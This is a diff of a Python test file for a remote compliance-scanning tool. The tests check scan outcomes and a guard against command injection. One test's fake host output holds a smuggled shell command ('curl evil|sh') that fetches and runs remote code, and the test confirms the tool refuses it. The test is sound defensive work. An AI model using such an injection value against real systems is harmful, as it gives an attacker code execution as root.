@@ -16,28 +16,10 @@ from grc_auditor.models import (
 from grc_auditor.remote import CommandResult
 from grc_auditor.scan import parse_xccdf_results, scan_host
 
-from conftest import fixture_path
+from conftest import FakeRemoteHost, fixture_path
 
 
 # --- remote command-injection guard (a hostile target must not get root RCE) ---
-
-class _MktempConn:
-    """Minimal fake connection: returns a scripted `mktemp` stdout, no-ops else."""
-
-    def __init__(self, mktemp_stdout):
-        self._mktemp_stdout = mktemp_stdout
-
-    def run(self, command, *, sudo=False, timeout=None):
-        if command.startswith("mktemp"):
-            return CommandResult(0, self._mktemp_stdout, "")
-        return CommandResult(0, "", "")
-
-    def run_argv(self, argv, *, sudo=False, timeout=None):
-        return CommandResult(0, "", "")
-
-    def get_file(self, remote, local):
-        pass
-
 
 def _plan():
     return ScanPlan(datastream_path="/usr/share/xml/scap/ssg/ds.xml",
@@ -48,7 +30,9 @@ def _plan():
 def test_malicious_mktemp_output_is_refused(tmp_path):
     # A compromised target whose `mktemp` emits a shell-injection payload must be
     # refused before that string can reach a sudo command -- not run as root.
-    conn = _MktempConn("/tmp/grc_audit.aaaaaa$IFS;curl evil|sh;#")
+    conn = FakeRemoteHost(responses=[
+        ("mktemp", CommandResult(0, "/tmp/grc_audit.aaaaaa$IFS;curl evil|sh;#", "")),
+    ])
     host = HostRecord(ip="10.0.0.9")
     with pytest.raises(RuntimeError):
         scan_host(host, conn, _plan(), "runid", str(tmp_path))
@@ -56,14 +40,44 @@ def test_malicious_mktemp_output_is_refused(tmp_path):
     assert "unexpected path" in (host.detail or "")
 
 
-def test_valid_mktemp_output_passes_the_guard(tmp_path):
-    # A normal mktemp path clears the regex (the scan fails later for lack of a
-    # real results.xml, but NOT on the path-shape guard).
-    conn = _MktempConn("/tmp/grc_audit.Ab3xZ9")
+def test_scan_host_happy_path_marks_scanned(tmp_path):
+    results_xml = open(fixture_path("xccdf-results.xml"), encoding="utf-8").read()
+    conn = FakeRemoteHost(
+        responses=[
+            ("mktemp", CommandResult(0, "/tmp/grc_audit.Ab3xZ9", "")),
+            ("xccdf eval", CommandResult(0, "", "")),
+            ("test -f", CommandResult(0, "", "")),
+        ],
+        files={"results.xml": results_xml},
+    )
     host = HostRecord(ip="10.0.0.9")
-    with pytest.raises(Exception):
+    scan = scan_host(host, conn, _plan(), "runid", str(tmp_path))
+    assert host.status is HostStatus.SCANNED
+    assert (scan.passed, scan.failed) == (3, 2)
+
+
+def test_scan_host_oscap_error_marks_scan_error(tmp_path):
+    conn = FakeRemoteHost(responses=[
+        ("mktemp", CommandResult(0, "/tmp/grc_audit.Ab3xZ9", "")),
+        ("xccdf eval", CommandResult(1, "", "bad profile")),
+    ])
+    host = HostRecord(ip="10.0.0.9")
+    with pytest.raises(RuntimeError):
         scan_host(host, conn, _plan(), "runid", str(tmp_path))
-    assert "unexpected path" not in (host.detail or "")
+    assert host.status is HostStatus.SCAN_ERROR
+
+
+def test_scan_host_no_results_file_marks_scan_error(tmp_path):
+    # oscap exited success but produced no results.xml -> a gap, not a clean pass.
+    conn = FakeRemoteHost(responses=[
+        ("mktemp", CommandResult(0, "/tmp/grc_audit.Ab3xZ9", "")),
+        ("xccdf eval", CommandResult(0, "", "")),
+        ("test -f", CommandResult(1, "", "")),
+    ])
+    host = HostRecord(ip="10.0.0.9")
+    with pytest.raises(RuntimeError):
+        scan_host(host, conn, _plan(), "runid", str(tmp_path))
+    assert host.status is HostStatus.SCAN_ERROR
 
 
 # --- scan chokepoint (never-false-pass: zero-outcome / sub-floor != SCANNED) --
